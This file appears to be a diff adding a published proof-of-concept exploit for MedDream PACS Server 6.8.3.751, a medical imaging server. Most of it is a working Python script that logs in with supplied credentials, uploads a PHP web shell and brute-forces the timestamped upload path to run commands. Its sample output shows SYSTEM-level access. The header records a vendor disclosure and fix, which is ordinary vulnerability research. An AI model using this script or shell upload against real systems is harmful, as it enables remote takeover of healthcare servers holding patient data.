@@ -1,0 +1,133 @@
+#!/usr/bin/python
+#
+#
+# Exploit Title: MedDream PACS Server 6.8.3.751 - Remote Code Execution (Authenticated)
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: MedDream PACS Server 6.8.3.751 - Remote Code Execution (Authenticated)
+# Date: 2020-10-01
+# Vulnerable Software: https://www.softneta.com/products/meddream-pacs-server/
+# Vendor Homepage: https://www.softneta.com
+# Version: 6.8.3.751
+# Tested On: Windows 2016
+#
+#
+# Timeline
+# 05-02-20: Submitted incident through email, immediate response
+# 05-04-20: Issue resolved, New version released 6.8.3.1.751
+# 
+# Note: Core Vulnerability resides in another product which has been remediated as well
+#
+##PoC##
+#
+# 1. create one line php shell to call commands
+# 2. run script on attacking machine
+# 3. enter parameters; IP, filename, username, password, command
+# 
+#
+# root@kali:~# python meddream.py 
+# Enter IP Address: 192.168.0.223
+# Enter payload filename + .php: cmd.php
+# Enter Username: user1
+# Enter Password: SoSecure!!
+# Enter command: whoami
+# 212357
+# <pre>nt authority\system
+# </pre>
+# http://192.168.0.223/Pacs/upload/20201001-212357--cmd.php?cmd=whoami
+# 404
+# 404
+# 404
+# 404
+# 404
+# 404
+# 404
+# 404
+# 404
+#
+#
+
+from urllib2 import urlopen                        
+from bs4 import BeautifulSoup
+import requests
+import sys
+import time
+from datetime import datetime, timedelta
+
+ip_addr = raw_input("Enter IP Address: ")
+user_file = raw_input("Enter payload filename + .php: ")
+uname = raw_input("Enter Username: ")
+pword = raw_input("Enter Password: ")
+cmd = raw_input("Enter command: ")
+
+URL1= 'http://' + ip_addr + '/Pacs/login.php'
+URL2= 'http://' + ip_addr + '/Pacs/authenticate.php'
+URL3= 'http://' + ip_addr + '/Pacs/uploadImage.php'
+
+def main():
+    session = requests.Session() 
+
+    site = session.get(URL1)
+    
+    soup = BeautifulSoup(site.content, "html.parser")
+    antispam = soup.find("input", {"name":"formAntiSpam"})["value"]
+    dbname = soup.find("input", {"name":"aetitle"})["value"]
+    login_data = {
+    'loginvalue': 'login',
+    'aetitle': dbname,
+    'username': uname,
+    'password': pword,
+    'formAntispam': antispam,
+    'login': 'Login',
+    }
+    
+    r = session.post(URL2, data = login_data)
+   
+
+    files = [
+    ('actionvalue', (None, 'Attach', None)),
+    ('uploadfile', (user_file, open(user_file, 'rb'), 'application/x-php')),
+    ('action', (None, 'Attach', None)),
+    ]
+
+    r = session.post(URL3, files=files)
+
+    today = datetime.today()
+    upload_date = today.strftime("%Y%m%d")
+
+    less = 1
+    now1 = datetime.now()
+    up_time1 = now1.strftime("%H%M%S")
+    print(up_time1)
+    #varying time checks +/-
+    now2 = now1 - timedelta(seconds=less)
+    up_time2 = now2.strftime("%H%M%S")
+    now3 = now2 - timedelta(seconds=less)
+    up_time3 = now3.strftime("%H%M%S")
+    now4 = now3 - timedelta(seconds=less)
+    up_time4 = now4.strftime("%H%M%S")
+    now5 = now4 - timedelta(seconds=less)
+    up_time5 = now5.strftime("%H%M%S")
+    now6 = now5 - timedelta(seconds=less)
+    up_time6 = now6.strftime("%H%M%S")
+    now7 = now6 - timedelta(seconds=less)
+    up_time7 = now7.strftime("%H%M%S")
+    now8 = now1 + timedelta(seconds=less)
+    up_time8 = now8.strftime("%H%M%S")
+    now9 = now8 + timedelta(seconds=less)
+    up_time9 = now8.strftime("%H%M%S")
+    now10 = now1 + timedelta(seconds=less)
+    up_time10 = now9.strftime("%H%M%S")
+
+
+    up_time_array = [up_time1, up_time2, up_time3, up_time4, up_time5, up_time6, up_time7, up_time8, up_time9, up_time10]  
+    for i in up_time_array: 
+        r = session.get('http://' + ip_addr + '/Pacs/upload/'+ upload_date + "-" + i + "--" + user_file + "?cmd=" + cmd)
+        if r.status_code == 200: 
+            print r.content
+            print r.url
+        else:
+            print ("404")
+
+if __name__ == '__main__':
+    main()
